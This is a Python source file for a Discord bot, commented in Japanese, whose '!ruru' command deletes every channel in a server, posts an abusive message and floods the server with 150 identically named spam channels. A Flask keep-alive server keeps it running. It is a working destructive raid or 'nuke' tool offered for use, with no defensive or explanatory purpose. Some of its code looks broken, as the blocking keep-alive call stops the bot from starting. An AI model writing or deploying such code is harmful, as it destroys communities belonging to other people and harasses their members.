import os
import discord
from discord.ext import commands, tasks
from flask import Flask
import asyncio

# ボットのトークンと接頭辞を設定
COMMAND_PREFIX = '!'

# ボットのインスタンスを作成
bot = commands.Bot(command_prefix=COMMAND_PREFIX)

@bot.command(name='ruru')
async def ruru(ctx):
    # サーバーのチャンネルリストを取得
    channels = ctx.guild.channels

    # チャンネル削除タスクを非同期で実行
    delete_tasks = []
    for channel in channels:
        task = asyncio.create_task(channel.delete(reason="All channels are being deleted by !ruru command"))
        delete_tasks.append(task)

    # 全ての削除タスクが完了するまで待機
    await asyncio.gather(*delete_tasks)

    # 全てのチャンネルが削除されたことを確認
    await ctx.send('All channels have been deleted. Fuck you all.')

    # 150個の「るるくん最強」チャンネルを作成
    for _ in range(150):
        await ctx.guild.create_text_channel('るるくん最強')

def keep_alive():
    # Keep-aliveサーバーの設定
    app = Flask('')

    @app.route('/')
    def home():
        return "Keep-alive server is running!"

    app.run(host='0.0.0.0', port=8080)

# --- Main Execution ---
# ⚠️ このブロックは、ファイルの全ての関数とコマンドの定義が終わった後、
# ⚠️ 最後に配置される必要があります。
if __name__ == "__main__":
    # 環境変数からトークンを直接取得
    TOKEN = os.environ.get("DISCORD_TOKEN")

    # ⚠️ トークンがない場合はエラーを表示
    if not TOKEN:
        print("エラー: 環境変数 'DISCORD_TOKEN' が設定されていません。")
    else:
        # 1. Keep-aliveサーバーを起動
        keep_alive()

        # 2. Discordボットを起動
        # ⚠️ ここでボットの変数名 (client または bot) をあなたのコードに合わせてください。
        # 例: client.run(TOKEN) または bot.run(TOKEN)
        bot.run(TOKEN)
